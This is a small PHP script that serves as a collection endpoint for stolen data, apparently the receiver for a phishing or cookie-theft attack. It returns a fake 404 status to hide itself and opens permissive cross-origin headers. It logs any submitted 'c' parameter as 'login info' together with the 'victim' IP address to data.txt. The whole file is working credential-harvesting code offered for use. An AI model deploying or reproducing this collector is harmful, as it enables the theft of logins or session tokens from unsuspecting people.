<html>

<?php

header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$file = 'data.txt';


if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
{
	
    $ip = getenv("REMOTE_ADDR");
    $message = '|================ login info ===============|'."\r\n";
    $message .= '|KEY                      :  '.$_REQUEST['c']."\r\n";
    $message .= "|IP Victime                 : http://www.geoiptool.com/?IP=".$ip."  ====\n";

    $file = fopen("$file","a+")or die("Unable to open file!");
    fwrite($file,$message);
    fclose($file);
}

?>

</html>

